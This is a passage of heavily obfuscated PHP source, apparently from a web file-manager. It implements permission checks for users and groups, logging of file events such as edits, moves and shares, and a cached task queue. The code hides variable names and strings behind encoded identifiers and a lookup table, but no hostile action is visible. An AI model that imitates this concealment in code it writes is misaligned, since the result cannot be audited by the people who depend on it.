(AuthModel::authCheckRoot($ÊÛ˜•öê[$ì¬îÜ«[421]])) { $£ßüÈìı[] = $–Ì€ø˜é[$ì¬îÜ«[1663]]; } } return $£ßüÈìı; } private function authFolderOwnerUser($é¼ë£¸×) { $´œóöÁø =& $_SERVER[ Ö‘ñÄ”]; $Ìüˆì£– = array(); $À•°à€İ = !1; foreach ($é¼ë£¸× as $å½óÔªä) { $¥Â°í‰ = $this->authInfo($å½óÔªä); if ($å½óÔªä[$´œóöÁø[513]] == $´œóöÁø[197]) { $À•°à€İ = !0; } if ($å½óÔªä[$´œóöÁø[419]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¥Â°í‰[$´œóöÁø[421]])) { $Ìüˆì£–[] = $å½óÔªä[$´œóöÁø[513]]; } } } return array($´œóöÁø[608] => $Ìüˆì£–, $´œóöÁø[2042] => $À•°à€İ); } public function authMake($ô­åÔï’, $˜Öî°¯È = false) { $™ñÙïÓ‡ =& $_SERVER[ Ö‘ñÄ”]; $èíà” = $this->authArrayCheck($ô­åÔï’, $˜Öî°¯È); if ($èíà”[$™ñÙïÓ‡[2044]]) { $èíà”[$™ñÙïÓ‡[2044]] = $this->sourceAuthInfo($èíà”[$™ñÙïÓ‡[2044]]); } return $èíà”; } public function authArrayCheck($©¦Ã–ùŞ, $“×öñ¸ = false) { $¼õšîâÖ =& $_SERVER[ Ö‘ñÄ”]; if (!$©¦Ã–ùŞ) { return array($¼õšîâÖ[422] => 0, $¼õšîâÖ[475] => !1); } $“×öñ¸ = $“×öñ¸ ? $“×öñ¸ : USER_ID; $çêÆÔõ† = 0; $Ä’ìäûı = 0; $¨ù‡¢“„ = 0; $‰ê«»òÊ = 0; $Å‹æ’Æ = 0; $ÄÒŸù“ = 0; $»æÙÍÙ• = 1000; $Û¦äû¶å = 0; $“ëÅ÷  = 0; $’¨Ñ¼Ûê = 0; $ÂòáĞ¯ = 0; $ªü µï = array($¼õšîâÖ[410] => 0); foreach ($©¦Ã–ùŞ as $ªü µï) { $ŞÖ‚¶Ùã = $this->authInfo($ªü µï); if (!$ŞÖ‚¶Ùã) { continue; } $ ‡®¡í = $ªü µï[$¼õšîâÖ[513]]; $ß‚«£êÎ = intval($ŞÖ‚¶Ùã[$¼õšîâÖ[421]]); if ($ªü µï[$¼õšîâÖ[419]] == SourceModel::TYPE_USER && $ ‡®¡í == $“×öñ¸) { $çêÆÔõ† = !0; $¨ù‡¢“„ = $ŞÖ‚¶Ùã; $Ä’ìäûı = $ß‚«£êÎ; } else { if ($ªü µï[$¼õšîâÖ[419]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ ‡®¡í, $“×öñ¸)) { $‰ê«»òÊ = !0; $Õöœ—šï = $this->groupStepToUserGroup($ ‡®¡í, $“×öñ¸); if ($Õöœ—šï < $»æÙÍÙ•) { $»æÙÍÙ• = $Õöœ—šï; $Å‹æ’Æ = $ß‚«£êÎ; $ÄÒŸù“ = $ŞÖ‚¶Ùã; $Û¦äû¶å = $ ‡®¡í; } if ($Õöœ—šï == $»æÙÍÙ• && $ß‚«£êÎ >= $Å‹æ’Æ) { $Å‹æ’Æ = $ß‚«£êÎ; $ÄÒŸù“ = $ŞÖ‚¶Ùã; $Û¦äû¶å = $ ‡®¡í; } } else { if ($ ‡®¡í == $¼õšîâÖ[197]) { $“ëÅ÷  = !0; $ÂòáĞ¯ = $ŞÖ‚¶Ùã; $’¨Ñ¼Ûê = $ß‚«£êÎ; } } } } if ($çêÆÔõ†) { $±Ä­Ê¤ˆ = $Ä’ìäûı; $ŞÖ‚¶Ùã = $¨ù‡¢“„; $Ö€˜å•Ø = LNG($¼õšîâÖ[2045]); } else { if ($‰ê«»òÊ) { $±Ä­Ê¤ˆ = $Å‹æ’Æ; $ŞÖ‚¶Ùã = $ÄÒŸù“; $ƒŒÍ÷¡ = Model($¼õšîâÖ[530])->getInfo($Û¦äû¶å); $Ö€˜å•Ø = $¼õšîâÖ[162] . $ƒŒÍ÷¡[$¼õšîâÖ[534]] . $¼õšîâÖ[2046] . LNG($¼õšîâÖ[2047]); } else { if ($“ëÅ÷ ) { $±Ä­Ê¤ˆ = $’¨Ñ¼Ûê; $ŞÖ‚¶Ùã = $ÂòáĞ¯; $Ö€˜å•Ø = LNG($¼õšîâÖ[2018]); } else { $±Ä­Ê¤ˆ = 0; $ŞÖ‚¶Ùã = !1; $Ö€˜å•Ø = $¼õšîâÖ[12]; } } } $ìõñÅ¤— = array($¼õšîâÖ[2037] => intval($±Ä­Ê¤ˆ), $¼õšîâÖ[2021] => $ŞÖ‚¶Ùã, $¼õšîâÖ[2038] => $Ö€˜å•Ø, $¼õšîâÖ[2030] => $ªü µï[$¼õšîâÖ[410]]); return $ìõñÅ¤—; } private function groupContainUser($­ÜëÙÏ, $ª’™š” = false) { return in_array($­ÜëÙÏ, $this->userGroupParents($ª’™š”)); } private function groupStepToUserGroup($×”¡¹£œ, $“ê¥º÷è = false) { $×ÉÈ„¾› =& $_SERVER[ Ö‘ñÄ”]; $ıî¶§† = $this->userGroupList($“ê¥º÷è); $ßş§ìš = 1000; $£–Ã“åğ = $GLOBALS[$×ÉÈ„¾›[6]][$×ÉÈ„¾›[89]][$×ÉÈ„¾›[1939]] == 1; $º¦Ä¡¥ = $£–Ã“åğ ? 3 : 2; foreach ($ıî¶§† as $’òñÙµñ) { if ($’òñÙµñ[$×ÉÈ„¾›[1836]] == $×”¡¹£œ) { return 0; } $âÖ¤»ø† = explode($×ÉÈ„¾›[50], trim($’òñÙµñ[$×ÉÈ„¾›[529]], $×ÉÈ„¾›[50])); if ($âÖ¤»ø†[0] == $×ÉÈ„¾›[197] && count($âÖ¤»ø†) > $º¦Ä¡¥) { $Ù…‘æñÍ = array_reverse(array_slice($âÖ¤»ø†, $º¦Ä¡¥)); $‚ÁÆ«í§ = array_search($×”¡¹£œ, $Ù…‘æñÍ); if ($‚ÁÆ«í§ !== !1 && $‚ÁÆ«í§ + 1 <= $ßş§ìš) { $ßş§ìš = $‚ÁÆ«í§ + 1; } } } return $ßş§ìš; } private function userGroupList($£÷ÙéÜü = false) { $Ó×‰ôÂÓ =& $_SERVER[ Ö‘ñÄ”]; static $Îß™ÄÅå = array(); if (isset($Îß™ÄÅå[$£÷ÙéÜü])) { return $Îß™ÄÅå[$£÷ÙéÜü]; } $ñİ†ñ¡ş = Model($Ó×‰ôÂÓ[543])->getInfo($£÷ÙéÜü); $Îß™ÄÅå[$£÷ÙéÜü] = array_to_keyvalue($ñİ†ñ¡ş[$Ó×‰ôÂÓ[2019]], $Ó×‰ôÂÓ[1836]); return $Îß™ÄÅå[$£÷ÙéÜü]; } public function userGroupParents($òİÛ£®¤) { $ûÎ¡ä… =& $_SERVER[ Ö‘ñÄ”]; static $ÁËØÜüÇ = array(); $òİÛ£®¤ = $òİÛ£®¤ ? $òİÛ£®¤ : USER_ID; if (isset($ÁËØÜüÇ[$òİÛ£®¤])) { return $ÁËØÜüÇ[$òİÛ£®¤]; } $Ì«÷²€ = $this->userGroupList($òİÛ£®¤); $ïùÏ›÷” = array(); $“Ô—ã‹ = $GLOBALS[$ûÎ¡ä…[6]][$ûÎ¡ä…[89]][$ûÎ¡ä…[1939]] == 1; $»ı½½“å = $“Ô—ã‹ ? 3 : 2; foreach ($Ì«÷²€ as $üÛ–İë¦) { $´Ì˜ˆæË = array($üÛ–İë¦[$ûÎ¡ä…[1836]]); $ËËíªŠ = explode($ûÎ¡ä…[50], trim($üÛ–İë¦[$ûÎ¡ä…[529]], $ûÎ¡ä…[50])); if ($ËËíªŠ[0] == $ûÎ¡ä…[197] && count($ËËíªŠ) > $»ı½½“å) { $Ç¦‡¼¬— = array_slice($ËËíªŠ, $»ı½½“å); $´Ì˜ˆæË = array_merge($´Ì˜ˆæË, array_reverse($Ç¦‡¼¬—)); } $ïùÏ›÷” = array_merge($ïùÏ›÷”, $´Ì˜ˆæË); } $ÁËØÜüÇ[$òİÛ£®¤] = array_unique($ïùÏ›÷”); return $ÁËØÜüÇ[$òİÛ£®¤]; } public function authTargetInfoMake($Ò¶ûÁÜá) { $Ì®Ç¤ò =& $_SERVER[ Ö‘ñÄ”]; $‚Õ˜øİ = array(); $š¢ùèŒ = array(); foreach ($Ò¶ûÁÜá as $é…ûĞÂ) { if ($é…ûĞÂ[$Ì®Ç¤ò[419]] == SourceModel::TYPE_USER) { $‚Õ˜øİ[] = intval($é…ûĞÂ[$Ì®Ç¤ò[513]]); } else { if ($é…ûĞÂ[$Ì®Ç¤ò[419]] == SourceModel::TYPE_GROUP) { $š¢ùèŒ[] = intval($é…ûĞÂ[$Ì®Ç¤ò[513]]); } } } if ($‚Õ˜øİ) { $‚Õ˜øİ = Model($Ì®Ç¤ò[521])->userListInfo($‚Õ˜øİ); } if ($š¢ùèŒ) { $è¹Š½¦ = array($Ì®Ç¤ò[1924] => array($Ì®Ç¤ò[426], $š¢ùèŒ)); $š¢ùèŒ = Model($Ì®Ç¤ò[530])->field($Ì®Ç¤ò[2048])->where($è¹Š½¦)->select(); $š¢ùèŒ = array_to_keyvalue($š¢ùèŒ, $Ì®Ç¤ò[1836]); } return array($Ì®Ç¤ò[2049] => $‚Õ˜øİ, $Ì®Ç¤ò[2050] => $š¢ùèŒ); } public function authInfo($²ÄåÙ—) { $ë­Ğ‘´ =& $_SERVER[ Ö‘ñÄ”]; if ($²ÄåÙ—[$ë­Ğ‘´[1940]]) { $±ëê¡… = Model($ë­Ğ‘´[515])->listData($²ÄåÙ—[$ë­Ğ‘´[1940]]); if (!$±ëê¡…) { return !1; $âÕÇÏÂî = Model($ë­Ğ‘´[515])->listData(); $¸ä«¤¤ş = array_filter_by_field($âÕÇÏÂî, $ë­Ğ‘´[421], $ë­Ğ‘´[197]); return $¸ä«¤¤ş; } $éú¤„Ó = array_field_key($±ëê¡…, array($ë­Ğ‘´[407], $ë­Ğ‘´[32], $ë­Ğ‘´[421], $ë­Ğ‘´[1859], $ë­Ğ‘´[1860])); $éú¤„Ó[$ë­Ğ‘´[2051]] = $²ÄåÙ—; return $éú¤„Ó; } else { return array($ë­Ğ‘´[427] => 0, $ë­Ğ‘´[1842] => $²ÄåÙ—[$ë­Ğ‘´[1996]], $ë­Ğ‘´[428] => $ë­Ğ‘´[12], $ë­Ğ‘´[1859] => $ë­Ğ‘´[2052]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\x72\x63\145\137\145\x76\x65\x6e\164"; protected $dataAuto = array(array("\x63\162\x65\141\x74\x65\124\151\x6d\145", "\x74\x69\x6d\x65", "\x69\x6e\x73\145\162\x74", "\x66\165\x6e\143\164\x69\157\x6e"), array("\x64\x65\x73\x63", '', "\151\x6e\163\145\x72\x74\x2c\165\160\144\141\x74\x65\54\163\145\x6c\x65\143\x74", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($óú‹ğÃ, $×í€¶»£, $ë£úÔ»Î = '') { $Éìıï¼ =& $_SERVER[ Ö‘ñÄ”]; if (!$this->eventSave) { return; } $¸ø¦ÎóÌ = Model($Éìıï¼[1333])->sourceInfo($óú‹ğÃ); if (!$¸ø¦ÎóÌ) { return !1; } if ($this->isCacheEvent($¸ø¦ÎóÌ, $×í€¶»£)) { return; } if ($ë£úÔ»Î && is_string($ë£úÔ»Î)) { $ë£úÔ»Î = array($Éìıï¼[1875] => $ë£úÔ»Î); } $øÆâ©é½ = array($Éìıï¼[425] => $óú‹ğÃ, $Éìıï¼[2053] => $¸ø¦ÎóÌ[$Éìıï¼[440]], $Éìıï¼[2054] => $¸ø¦ÎóÌ[$Éìıï¼[32]], $Éìıï¼[527] => !empty($¸ø¦ÎóÌ[$Éìıï¼[527]]) ? $¸ø¦ÎóÌ[$Éìıï¼[527]] : $Éìıï¼[12], $Éìıï¼[1654] => USER_ID, $Éìıï¼[430] => $×í€¶»£, $Éìıï¼[1656] => $ë£úÔ»Î); $this->addSystemLog($×í€¶»£, $øÆâ©é½); unset($øÆâ©é½[$Éìıï¼[2054]], $øÆâ©é½[$Éìıï¼[527]]); return $this->add($øÆâ©é½); } private function addSystemLog($—÷×—ù¦, $Ûûğ¼¬) { $½íæ§õ =& $_SERVER[ Ö‘ñÄ”]; if ($—÷×—ù¦ == $½íæ§õ[2055]) { $—÷×—ù¦ = $Ûûğ¼¬[$½íæ§õ[461]][$½íæ§õ[2056]]; } else { if (in_array($—÷×—ù¦, array($½íæ§õ[1816], $½íæ§õ[2057]))) { $—÷×—ù¦ = $Ûûğ¼¬[$½íæ§õ[461]][$½íæ§õ[768]]; } } $¡æ«ßä = array_merge($Ûûğ¼¬, array($½íæ§õ[2058] => $Ûûğ¼¬[$½íæ§õ[410]], $½íæ§õ[2059] => $Ûûğ¼¬[$½íæ§õ[2059]])); Hook::trigger($½íæ§õ[2060], $½íæ§õ[2061] . $—÷×—ù¦, $Ûûğ¼¬); Model($½íæ§õ[1780])->addLog($½íæ§õ[2061] . $—÷×—ù¦, $¡æ«ßä); } private function isCacheEvent($î¥üÃÀ², $œÍåĞŒ¾) { if ($î¥üÃÀ²[$_SERVER[ Ö‘ñÄ”][419]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($½«âèŒ×, $µÇÅ±–) { $áï“ÍçÇ =& $_SERVER[ Ö‘ñÄ”]; $ƒÓ¬‘…ƒ = Model($áï“ÍçÇ[1333])->sourceInfo($½«âèŒ×); $¾­Õøæ¹ = array($áï“ÍçÇ[2056] => $µÇÅ±–, $áï“ÍçÇ[32] => $ƒÓ¬‘…ƒ[$áï“ÍçÇ[32]]); return $this->addEvent($½«âèŒ×, $áï“ÍçÇ[2055], $¾­Õøæ¹); } public function eventFileEdit($òİã›­) { $Ôıõ–¼¼ =& $_SERVER[ Ö‘ñÄ”]; $ÃÈ›ÎÏ = array($Ôıõ–¼¼[2062] => $_SERVER[$Ôıõ–¼¼[2063]], $Ôıõ–¼¼[2064] => strtolower(ACTION)); if (isset($GLOBALS[$Ôıõ–¼¼[7]][$Ôıõ–¼¼[2065]])) { $ÃÈ›ÎÏ[$Ôıõ–¼¼[2065]] = $Ôıõ–¼¼[88]; } return $this->addEvent($òİã›­, $Ôıõ–¼¼[1806], $ÃÈ›ÎÏ); } public function eventRecycle($ÌŒĞ¬—ë, $ëéä¤ÉÆ) { return $this->addEvent($ÌŒĞ¬—ë, $_SERVER[ Ö‘ñÄ”][2057], $ëéä¤ÉÆ); } public function eventRemove($â¥—óû) { $ñìŞ®Ü =& $_SERVER[ Ö‘ñÄ”]; $ÎñÂü¦Ÿ = Model($ñìŞ®Ü[1333])->sourceInfo($â¥—óû); $°’Í‚Ä = $ÎñÂü¦Ÿ[$ñìŞ®Ü[32]]; return $this->addEvent($ÎñÂü¦Ÿ[$ñìŞ®Ü[440]], $ñìŞ®Ü[1805], $°’Í‚Ä); } public function eventShare($® ‘âŞ, $é¹ §â) { return $this->addEvent($® ‘âŞ, $_SERVER[ Ö‘ñÄ”][1816], $é¹ §â); } public function eventMove($Ä¹ûÊË½, $àäòğ³ø, $¸…õééĞ) { $¹…¦Ñßê =& $_SERVER[ Ö‘ñÄ”]; $ÑÏüïä = Model($¹…¦Ñßê[1333]); $„ºë¥ = $ÑÏüïä->sourceInfo($Ä¹ûÊË½); $ú»úü¬ú = $ÑÏüïä->sourceInfo($àäòğ³ø); $ÛçüÓ÷ = $ÑÏüïä->sourceInfo($¸…õééĞ); $Âã¡ƒŞ = array($¹…¦Ñßê[1166] => $àäòğ³ø, $¹…¦Ñßê[2066] => $ú»úü¬ú[$¹…¦Ñßê[32]], $¹…¦Ñßê[2044] => !empty($ú»úü¬ú[$¹…¦Ñßê[527]]) ? $ú»úü¬ú[$¹…¦Ñßê[527]] : $¹…¦Ñßê[12], $¹…¦Ñßê[1167] => $¸…õééĞ, $¹…¦Ñßê[2067] => $ÛçüÓ÷[$¹…¦Ñßê[32]], $¹…¦Ñßê[2068] => !empty($ÛçüÓ÷[$¹…¦Ñßê[527]]) ? $ÛçüÓ÷[$¹…¦Ñßê[527]] : $¹…¦Ñßê[12]); $this->addEvent($Ä¹ûÊË½, $¹…¦Ñßê[565], $Âã¡ƒŞ); $„ºë¥ = $ÑÏüïä->sourceInfo($Ä¹ûÊË½); $Âã¡ƒŞ = array($¹…¦Ñßê[410] => $„ºë¥[$¹…¦Ñßê[410]], $¹…¦Ñßê[32] => $„ºë¥[$¹…¦Ñßê[32]]); $this->addEvent($àäòğ³ø, $¹…¦Ñßê[2069], $Âã¡ƒŞ); } public function eventCopy($Úƒ®¯äÛ) { $this->eventCreate($Úƒ®¯äÛ, $_SERVER[ Ö‘ñÄ”][563]); } public function eventRename($Ş‡„šÉÈ, $Ûíˆ¼£Ó, $·•ø¡Ó) { $±ğÄ«‹ =& $_SERVER[ Ö‘ñÄ”]; $ïµ¶´ÁÍ = array($±ğÄ«‹[1166] => $Ûíˆ¼£Ó, $±ğÄ«‹[1167] => $·•ø¡Ó); return $this->addEvent($Ş‡„šÉÈ, $±ğÄ«‹[1348], $ïµ¶´ÁÍ); } public function eventAddComment($™¹Æ“Ğß, $ú‚¼¼Ä) { return $this->addEvent($™¹Æ“Ğß, $_SERVER[ Ö‘ñÄ”][2070], $ú‚¼¼Ä); } public function eventAddDesc($½«³úÕØ, $¦ÚÍ‰˜ø) { return $this->addEvent($½«³úÕØ, $_SERVER[ Ö‘ñÄ”][2071], $¦ÚÍ‰˜ø); } public function listBySource($‹‚øÀÚ) { $æˆùèÌÖ =& $_SERVER[ Ö‘ñÄ”]; $ÆØ‹ğÌÕ = Model($æˆùèÌÖ[1333])->sourceInfo($‹‚øÀÚ); $ĞÉ¼¯Š¼ = array($æˆùèÌÖ[425] => $‹‚øÀÚ); if ($ÆØ‹ğÌÕ[$æˆùèÌÖ[418]] == $æˆùèÌÖ[88]) { $µ÷‰†„ = Model($æˆùèÌÖ[1333])->listSearchChildren($‹‚øÀÚ, 20000); $µ÷‰†„[] = $‹‚øÀÚ . $æˆùèÌÖ[246]; $ĞÉ¼¯Š¼ = array($æˆùèÌÖ[410] => array($æˆùèÌÖ[7], $µ÷‰†„)); } $¯š–³Ë² = $this->where($ĞÉ¼¯Š¼)->order($æˆùèÌÖ[2072])->selectPage(); if ($¯š–³Ë²[$æˆùèÌÖ[375]][$æˆùèÌÖ[376]] == 0) { $¯š–³Ë²[$æˆùèÌÖ[375]][$æˆùèÌÖ[376]] = 1; $¯š–³Ë²[$æˆùèÌÖ[378]] = array(array($æˆùèÌÖ[425] => $‹‚øÀÚ, $æˆùèÌÖ[2053] => $ÆØ‹ğÌÕ[$æˆùèÌÖ[440]], $æˆùèÌÖ[1654] => $ÆØ‹ğÌÕ[$æˆùèÌÖ[462]], $æˆùèÌÖ[430] => $æˆùèÌÖ[2073], $æˆùèÌÖ[431] => $ÆØ‹ğÌÕ[$æˆùèÌÖ[200]], $æˆùèÌÖ[1656] => $æˆùèÌÖ[12])); } return $this->eventListParse($¯š–³Ë², $‹‚øÀÚ); } private function eventListParse($Š…€”‘Ğ, $…‰ğî§´) { $¥ÛçÍø² =& $_SERVER[ Ö‘ñÄ”]; $Õ—ËÖĞŒ = $Š…€”‘Ğ[$¥ÛçÍø²[378]]; $Í´ééŠ = array_to_keyvalue($Õ—ËÖĞŒ, $¥ÛçÍø²[12], $¥ÛçÍø²[410]); $òôß¦î’ = array_to_keyvalue($Õ—ËÖĞŒ, $¥ÛçÍø²[12], $¥ÛçÍø²[2059]); foreach ($Õ—ËÖĞŒ as $ÛÄö£Ô) { $ÎßÆ¸ö‚ = $ÛÄö£Ô[$¥ÛçÍø²[461]]; if ($ÛÄö£Ô[$¥ÛçÍø²[33]] == $¥ÛçÍø²[565] && isset($ÎßÆ¸ö‚[$¥ÛçÍø²[1166]])) { $Í´ééŠ[] = $ÎßÆ¸ö‚[$¥ÛçÍø²[1166]] . $¥ÛçÍø²[12]; $Í´ééŠ[] = $ÎßÆ¸ö‚[$¥ÛçÍø²[1167]] . $¥ÛçÍø²[12]; } if ($ÛÄö£Ô[$¥ÛçÍø²[33]] == $¥ÛçÍø²[2069] && isset($ÎßÆ¸ö‚[$¥ÛçÍø²[410]])) { $Í´ééŠ[] = $ÎßÆ¸ö‚[$¥ÛçÍø²[410]] . $¥ÛçÍø²[12]; } } $Í´ééŠ = array_merge($Í´ééŠ, $òôß¦î’, array($…‰ğî§´ . $¥ÛçÍø²[12])); $Í´ééŠ = array_unique($Í´ééŠ); $¶­¶¦à‹ = array_unique(array_to_keyvalue($Õ—ËÖĞŒ, $¥ÛçÍø²[12], $¥ÛçÍø²[1663])); $¬í«ˆ®œ = Model($¥ÛçÍø²[543])->userListInfo($¶­¶¦à‹); $ù´ÆÁ = Model($¥ÛçÍø²[838])->sourceListInfo($Í´ééŠ, !0); foreach ($Õ—ËÖĞŒ as &$ÛÄö£Ô) { if ($ÛÄö£Ô[$¥ÛçÍø²[33]] == $¥ÛçÍø²[565] && isset($ÛÄö£Ô[$¥ÛçÍø²[461]][$¥ÛçÍø²[1166]])) { $ÛÄö£Ô[$¥ÛçÍø²[461]][$¥ÛçÍø²[1166]] = $ù´ÆÁ[$ÛÄö£Ô[$¥ÛçÍø²[461]][$¥ÛçÍø²[1166]]]; $ÛÄö£Ô[$¥ÛçÍø²[461]][$¥ÛçÍø²[1167]] = $ù´ÆÁ[$ÛÄö£Ô[$¥ÛçÍø²[461]][$¥ÛçÍø²[1167]]]; } if ($ÛÄö£Ô[$¥ÛçÍø²[33]] == $¥ÛçÍø²[2069] && isset($ÛÄö£Ô[$¥ÛçÍø²[461]][$¥ÛçÍø²[410]])) { $ÛÄö£Ô[$¥ÛçÍø²[461]][$¥ÛçÍø²[410]] = $ù´ÆÁ[$ÛÄö£Ô[$¥ÛçÍø²[461]][$¥ÛçÍø²[410]]]; } $ÛÄö£Ô[$¥ÛçÍø²[86]] = $ù´ÆÁ[$ÛÄö£Ô[$¥ÛçÍø²[410]]]; $ÛÄö£Ô[$¥ÛçÍø²[2074]] = $ù´ÆÁ[$ÛÄö£Ô[$¥ÛçÍø²[2059]]]; if ($ÛÄö£Ô[$¥ÛçÍø²[33]] == $¥ÛçÍø²[1805]) { $ÛÄö£Ô[$¥ÛçÍø²[2074]] = $ÛÄö£Ô[$¥ÛçÍø²[86]]; $ÛÄö£Ô[$¥ÛçÍø²[2059]] = $ÛÄö£Ô[$¥ÛçÍø²[2074]][$¥ÛçÍø²[410]]; $ÛÄö£Ô[$¥ÛçÍø²[86]] = !1; $ÛÄö£Ô[$¥ÛçÍø²[410]] = $¥ÛçÍø²[12]; } $ÛÄö£Ô[$¥ÛçÍø²[2004]] = $¬í«ˆ®œ[$ÛÄö£Ô[$¥ÛçÍø²[1663]]]; } unset($ÛÄö£Ô); $Š…€”‘Ğ[$¥ÛçÍø²[378]] = $Õ—ËÖĞŒ; return $Š…€”‘Ğ; } public function removeBySource($ÆŸœ½ §) { $õÔ»ğî = array($_SERVER[ Ö‘ñÄ”][425] => $ÆŸœ½ §); $this->where($õÔ»ğî)->remove(); } } goto e÷õ‰—ÌÖÂ; b˜ÎëÎæ­î: class TaskHttp extends Task { protected function startAfter() { $›£ÛÁÆÃ =& $_SERVER[ Ö‘ñÄ”]; $Û×Ñƒà¢ =& $this->task; $Û×Ñƒà¢[$›£ÛÁÆÃ[1738]] = 1; Hook::bind($›£ÛÁÆÃ[1706], array($this, $›£ÛÁÆÃ[1739])); Hook::bind($›£ÛÁÆÃ[1708], array($this, $›£ÛÁÆÃ[1740])); Hook::bind($›£ÛÁÆÃ[1710], array($this, $›£ÛÁÆÃ[1741])); } protected function endAfter() { $’Ã¶ôá¯ =& $_SERVER[ Ö‘ñÄ”]; Hook::unbind($’Ã¶ôá¯[1706], array($this, $’Ã¶ôá¯[1739])); Hook::unbind($’Ã¶ôá¯[1708], array($this, $’Ã¶ôá¯[1740])); Hook::unbind($’Ã¶ôá¯[1710], array($this, $’Ã¶ôá¯[1741])); } public function progressStart($ùòúŒšÁ) { $ÌèƒóøÄ =& $_SERVER[ Ö‘ñÄ”]; $“’ˆ÷ş± = curl_getinfo($ùòúŒšÁ); self::log($ÌèƒóøÄ[1742] . $“’ˆ÷ş±[$ÌèƒóøÄ[316]]); self::valueSet($this->task[$ÌèƒóøÄ[407]], $this->task); } public function progressEnd($×ƒÛø) { $…«¶ÄßÅ =& $_SERVER[ Ö‘ñÄ”]; self::log($…«¶ÄßÅ[1743] . $this->task[$…«¶ÄßÅ[407]]); $this->end(); } public function progress($Üú™Ì², $§¾‚Ÿ»×, $¶Ë¡óı¨, $Ç¿ËË¼‚, $¹á‡‡ø) { $Ü£ÆÊ¾ =& $_SERVER[ Ö‘ñÄ”]; $Î•ÈÙïµ =& $this->task; if ($¹á‡‡ø > 0) { $Î•ÈÙïµ[$Ü£ÆÊ¾[799]] = $Î•ÈÙïµ[$Ü£ÆÊ¾[799]] == 0 ? $Ç¿ËË¼‚ : $Î•ÈÙïµ[$Ü£ÆÊ¾[799]]; $Î•ÈÙïµ[$Ü£ÆÊ¾[1664]] = $¹á‡‡ø; } else { if ($¶Ë¡óı¨ > 0) { $Î•ÈÙïµ[$Ü£ÆÊ¾[799]] = $Î•ÈÙïµ[$Ü£ÆÊ¾[799]] == 0 ? $§¾‚Ÿ»× : $Î•ÈÙïµ[$Ü£ÆÊ¾[799]]; $Î•ÈÙïµ[$Ü£ÆÊ¾[1664]] = $¶Ë¡óı¨; } } $this->update(); self::log("\x70\x72\157\147\162\x65\163\163\x48\164\x74\x70\72\144\157\x77\x6e\72{$¶Ë¡óı¨}\57{$§¾‚Ÿ»×}\73\40\165\160\154\157\141\x64\72{$¹á‡‡ø}\x2f{$Ç¿ËË¼‚}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\153\x51\165\x65\165\x65\x4c\x65\156\147\x74\x68"; const QUEUE_DATA = "\x74\x61\163\x6b\x51\165\x65\x75\145\104\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($¦£ßĞˆì, $³œ×ËÍ = array(), $“ÀÖë½ò = '', $é¬˜¼ªú = '') { $¥á¦Ë =& $_SERVER[ Ö‘ñÄ”]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($é¬˜¼ªú && array_find_by_field(self::$listData, $¥á¦Ë[94], $é¬˜¼ªú)) { return !0; } self::$listData[] = array($¥á¦Ë[273] => $¦£ßĞˆì, $¥á¦Ë[1744] => $³œ×ËÍ, $¥á¦Ë[461] => $“ÀÖë½ò, $¥á¦Ë[94] => $é¬˜¼ªú); return !0; } public static function addSubmit() { $óĞí¸¯ğ =& $_SERVER[ Ö‘ñÄ”]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($óĞí¸¯ğ[1745] . json_encode_force(array_to_keyvalue(self::$listData, $óĞí¸¯ğ[12], $óĞí¸¯ğ[461])), $óĞí¸¯ğ[1746]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ã¹Æö, $ÀæüÖ»ù = array(), $¥•¼üÛ = '', $İºŸİ³ª = '') { $ª®Ùƒ¥  =& $_SERVER[ Ö‘ñÄ”]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Û‚Ù· = self::getAll(); if ($İºŸİ³ª && array_find_by_field($Û‚Ù·, $ª®Ùƒ¥ [94], $İºŸİ³ª)) { return !0; } $Û‚Ù·[] = array($ª®Ùƒ¥ [273] => $ã¹Æö, $ª®Ùƒ¥ [1744] => $ÀæüÖ»ù, $ª®Ùƒ¥ [461] => $¥•¼üÛ, $ª®Ùƒ¥ [94] => $İºŸİ³ª); write_log($ª®Ùƒ¥ [1745] . $¥•¼üÛ, $ª®Ùƒ¥ [1746]); self::setAll($Û‚Ù·); return !0; } public static function run() { $ºóôĞŒ´ =& $_SERVER[ Ö‘ñÄ”]; $ŒšàÌó = self::getAll(); $Â™ªô©ó = array_shift($ŒšàÌó); if (!$Â™ªô©ó) { return !1; } self::setAll($ŒšàÌó); $¢¢¼©çı = timeFloat(); try { Hook::apply($Â™ªô©ó[$ºóôĞŒ´[273]], $Â™ªô©ó[$ºóôĞŒ´[1744]]); } catch (Exception $œùäƒ®¥) { } $Ñæü‹·Ô = number_format(timeFloat() - $¢¢¼©çı, 3) . $ºóôĞŒ´[1679]; write_log($ºóôĞŒ´[1747] . $Â™ªô©ó[$ºóôĞŒ´[461]] . $ºóôĞŒ´[1748] . $Ñæü‹·Ô, $ºóôĞŒ´[1746]); return !0; } public static function count() { $«åÙªó“ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$«åÙªó“) { return 0; } return intval($«åÙªó“); } public static function getAll() { $ëü„ö› = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ëü„ö›) { return array(); } return $ëü„ö›; } public static function setAll($˜öè“Õ¤) { $ÌßĞµÃ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($˜öè“Õ¤), $ÌßĞµÃ); Cache::set(self::QUEUE_DATA, $˜öè“Õ¤, $ÌßĞµÃ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¤Îõó†Ş, $³–ÀÂ¨Ğ = 5.0) { if (!$¤Îõó†Ş) { return; } $”˜İÜ¸ã = Cache::get($¤Îõó†Ş); if (!$”˜İÜ¸ã || timeFloat() - floatVal($”˜İÜ¸ã) >= $³–ÀÂ¨Ğ) { Cache::set($¤Îõó†Ş, 